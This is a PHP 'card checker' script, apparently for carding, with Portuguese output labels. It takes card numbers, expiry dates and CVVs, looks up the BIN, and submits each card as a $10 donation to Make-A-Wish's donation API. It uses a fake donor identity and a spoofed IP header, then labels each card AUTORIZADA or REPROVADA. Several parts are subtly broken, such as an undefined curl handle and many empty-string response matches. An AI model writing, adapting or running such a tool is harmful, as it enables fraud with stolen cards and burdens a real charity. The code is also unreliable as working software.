<?php
error_reporting(0);
set_time_limit(60);

function value($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
    }
    
    $random = substr(str_shuffle(str_repeat("0123456789abcdefghijklmnopqrstuvwxyz", 6)), 0, 6);

    $num = rand(1, 5);

    $rand1 = rand(0, 15);
    
    

if($_GET['testar']=="cc"){
    $ccs = $_GET['ccs'];
    $separador  = $_GET['separador'];
    $id     = $_GET['id'];
    $explode = explode($separador, $ccs);
if (substr($explode[0], 0, 1) == '4') {
        $info = '2418';
    } elseif (substr($explode[0], 0, 1) == '5, 2') {
        $info = '2417';
    } elseif (substr($explode[0], 0, 1) == '6') {
        $info = '2416';
    }elseif (substr($explode[0], 0, 1) == '3') {
        $info = '2414';
    } 
    
    else {
        $bander = '<font color="#ff0000"><i class="fa fa-cc" aria-hidden="true"></font>';
    }
 

$numero = $explode[0];
$mes = $explode[1];
$ano = $explode[2];
$cvv = $explode[3];


    

 function _curl($url,$post,$link='',$cookie,$httpheader){
$ch = curl_init();
if($post){
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
}
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36'); // RADOM DOS NAVEGADORES
curl_setopt($ch, CURLOPT_FORBID_REUSE, true);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
curl_setopt($ch, CURLOPT_FRESH_CONNECT, true);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_POSTREDIR, 3);
if ($httpheader) {curl_setopt($ch, CURLOPT_HTTPHEADER, $httpheader);}
curl_setopt($ch, CURLOPT_COOKIESESSION, false);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookies.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies.txt');
curl_setopt($ch, CURLOPT_LOW_SPEED_LIMIT, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
//curl_setopt($ch, CURLOPT_PROXY, 'gate.smartproxy.com:7000');
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'joaogay1:joaogay1');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  $result = curl_exec($ch);
curl_close($ch);
return $result;
}

    
##########################################

$bin = substr($numero, 0, 6);

$numero1 = substr($numero, 0, 4);
$numero2 = substr($numero, 5, 8);
$numero3 = substr($numero, 9, 12);
$numero4 = substr($numero, 13, 16);

$link = "https://lookup.binlist.net";
$post = "cclist=".$bin."";
$curl = _curl($link, $post);



htmlentities($curl);

$xd = explode('</td>', $curl);

$xd = str_replace("<td  align='center'>", "", $xd);

$bandeira = $xd[2];
$banco = $xd[1];
$tipo = $xd[4];
$pais = $xd[5];

$banco1 = value($banco, '<a href="','" target="_blank">');
$banco = str_replace($banco1, "", $banco);
$banco = str_replace('<a href="" target="_blank">', "", $banco);
$banco = str_replace('</a>', "", $banco);
$pais = str_replace("<td  align='center' >", "", $pais);

##########################################
 
     switch ($mes) {
         case '1':
         $mes = '01';
         break;
         case '2':
         $mes = '02';
         break;
         case '3':
         $mes = '03';
         break;
         case '4':
         $mes = '04';
         break;
         case '5':
         $mes = '05';
         break;
         case '6':
         $mes = '06';
         break;
         case '7':
         $mes = '07';
         break;
         case '8':
         $mes = '08';
         break;
         case '9':
         $mes = '09';
         break;
     }
 /*
     switch ($ano) {
         case '17':
         $ano = '2017';
         break;
         case '18':
         $ano = '2018';
         break;
         case '19':
         $ano = '2019';
         break;
         case '20':
         $ano = '2020';
         break;
         case '21':
         $ano = '2021';
         break;
         case '22':
         $ano = '2022';
         break;
         case '23':
         $ano = '2023';
         break;
         case '24':
         $ano = '2024';
         break;
         case '24':
         $ano = '2025';
         break;
     }
     */


curl_setopt($ch, CURLOPT_HTTPHEADER, array(

"X-Forwarded-For: ".$randIP
    ));
$curl = curl_init();
$randIP = "".mt_rand(0,255).".".mt_rand(0,255).".".mt_rand(0,255).".".mt_rand(0,255);




$link = 'https://secure2.wish.org/site/CRDonationAPI'; 
$post = 'luminateExtend=1.7.1&new_donation_form=true&other_amount=10&s_ecard_to_first=&s_ecard_to_last=&s_ecard_full_name=&s_ecard_from=&s_productURL1=&chapter_id=100-000&s_donorIntentID=100-000&s_donorIntentName=Make-A-Wish%C2%AE%20America&billing.name.first=VANEI&billing.name.last=BOGES&billing.address.street1=Rua Casa do Ator&billing.address.street2=casa&billing.address.zip=10001&billing.address.city=Nova Iorque&billing.address.state=NY&billing.address.country=United States&s_chid=100-000&method=donate&remember_me=false&summary=data&validate=true&form_id=1542&foreign_key1=MNOO21&foreign_key2=UR-100-01&foreign_key3=21ON-NSP-WNAT&foreign_key4=OT-NT-WNAT&foreign_key5=DEV-Multimedia+Online&s_src=&source=&s_subsrc=&sub_source=&currentURL=https%3A%2F%2Fsecure2.wish.org%2Fsite%2FSPageServer%3Fpagename%3Ddonate_today%26amp%3Bchid%3D100-000&securePath=https%3A%2F%2Fsecure2.wish.org%2Fsite%2F&level_id=2031&ecard.id=&honoree_full_name=&honoree_first_name=&honoree_last_name=&ecard.recipients=&from_name=&donor_intent_type=national&donor.name.first=VANEI&donor.name.last=BOGES&donor.address.street1=Rua+Casa+do+Ator&donor.address.street2=casa&donor.address.zip=10001&donor.address.city=Nova+Iorque&donor.address.state=NY&donor.email=netdou3%40gmail.com&donor.email_opt_in=true&double_the_donation_company_id=&doubledonation_status=not_found&doublethedonation_status=not_found&doublethedonation_entered_text=vb&doubledonation_company_id=&doublethedonation_company_id=&doubledonation_company_name=&doublethedonation_company_name=&doublethedonation_company_name_input=vb&donor.address.country=United+States&payment_type=credit&card_number='.$numero.'&card_exp_date_month='.$mes.'&card_exp_date_year='.$ano.'&card_cvv='.$cvv.'&ach_account_type=CHECKING&ach_routing=&ach_account=&ach_account_verify=&api_key=mu3fefod&response_format=json&suppress_response_codes=true&v=1.0&ts=1630271053399';
$c = _curl($link,$post);




$csrf = value($a,'<input name="id" type="hidden" value="','">');
$token = value($c,'<input name="__RequestVerificationToken" type="hidden" value="','">');
$payment_id = value($a,'<input type="hidden" name="payment_id" value="','">');
$hpp_ticket = value($a,'<input type="hidden" name="frm_id" value="','">');
$return = value($a,'<input type="hidden" name="timestamp" value="','">');
$session = value($a,'<input type="hidden" name="form_page_url" value="','">');
 


//echo $c;    




/**/


htmlentities($c);
    
         if (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."| $".$num." AUTORIZADA CVV INCORRETO";
                    
            }

            elseif (strpos($c, "transaction_id") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."| $".$num." AUTORIZADA ";
                    
            }

            elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."| $".$num." AUTORIZADA AUTH-BB";
                    
            }

            elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."| $".$num." AUTORIZADA AUTH";
                    
            }



            elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|$".$num." AUTORIZADA VBV";
                    
            } 


            elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."| $".$num." AUTORIZADA AVS";
                    
            }

            elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA BLACKLIST";
                    
           }

            elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA NOT SUPPORTED";
                    
           }


           elseif (strpos($c, "The credit card was declined. Please check the information that you entered.") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."| REPROVADA WAS DECLINED";
                    
            }

            elseif (strpos($c, "Insufficient Funds") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."| REPROVADA SEM FUNDOS";
                    
            }

            elseif (strpos($c, "There was a problem encountered while processing your donation.") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA ";
                    
           }

           elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA DECLINE";
                    
           }

           elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA DECLINE";
                    
           }

           elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA DECLINE";
                    
           }

           elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA DECLINE";
                    
           }

           elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA DECLINE";
                    
           }

            elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA DECLINE";
                    
           }

           elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA DECLINE";
                    
           }

           elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA DECLINE";
                    
           }


           elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA DECLINE";
                    
           }

           elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA DECLINE";
                    
           }

           elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA DECLINE";
                    
           }

           elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA DECLINE";
                    
           }

           elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA DECLINE";
                    
           }

           elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA DECLINE";
                    
           }


          elseif (strpos($c, "Your card was declined.") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA DECLINED";
                    
           }

           elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA DECLINE";
                    
           }

           elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA DECLINE";
                    
           }

           elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA DECLINE";
                    
           }


           elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA DECLINE";
                    
           }


           elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA DECLINE";
                    
            }

            elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA DECLINE";
                    
            }

            elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA DECLINE";
                    
            }


            elseif (strpos($c, "There was an error processing your credit card") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA DECLINE";
                    
            }

            elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA DECLINE";
                    
            }

            elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA DECLINE";
                    
            }

            elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA DECLINE";
                    
            }

            elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA REFUSED";
                    
            }

            elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA NOT ALLOWED";
                    
            }

            elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA NOT COMPLETE";
                    
            }

            elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA DUPLICADA";
                    
            }

            elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA RESTRITA";
                    
            }

            elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA STOLEN";
                    
            }

            elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA STOLEN";
                    
            }

            elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA STOLEN";
                    
            }


            elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA STOLEN";
                    
            }

            elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA EMISSOR INVALIDO";
                    
            }

            elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA CARD INCORRETO";
                    
           }

           elseif (strpos($c, "Your card number is incorrect") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA CARD INCORRETO";
                    
           }

           elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA CONTA INVALIDA";
                    
           }

           elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA CONTA INVALIDA";
                    
           }

           elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA CONTA INVALIDA";
                    
           }

           elseif (strpos($c, ")") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA CONTA INVALIDA";
                    
           }


           elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA CONTA INVALIDA";
                    
           }

           elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA CONTA INVALIDA";
                    
           }


           elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA GATE CAIU";
                    
           }


           elseif (strpos($c, "Your card does not support this type of purchase") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA NÃO SUPORTADO";
                    
           }

           elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA EXPIRED";
                    
           }

            elseif (strpos($c, "Your card has expired.") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA EXPIRED";
                    
           }

           elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA EXPIRED";
                    
           }


           elseif (strpos($c, "An error occurred while processing your card") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA ERRO AO PROCESSAR";
                    
           }


           elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA INVALID CARD";
                    
            }


            elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA INVALID CARD";
                    
            }


            elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA INVALID CC NUMBER";
                    
            }

            elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA INVALID CARD";
                    
            }

            elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA INVALID INFORMATION";
                    
            }

            elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA CARD NOT ACCEPT";
                    
            }

            elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA CARD DECLINE";
                    
            }


            elseif (strpos($c, "") !== false) {
        //      echo "".$numero."|AUTORIZADA ";
       // echo "".$numero."|".$mes."|".$ano."|".$cvv."|ERRO:REPROVADA";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA GENERIC ERROR";
                    
            }


             else {
               
              /// echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA CARD REPROVADO";
                echo "".$numero."|".$mes."|".$ano."|".$cvv."|REPROVADA ERROR";
      }
      
}
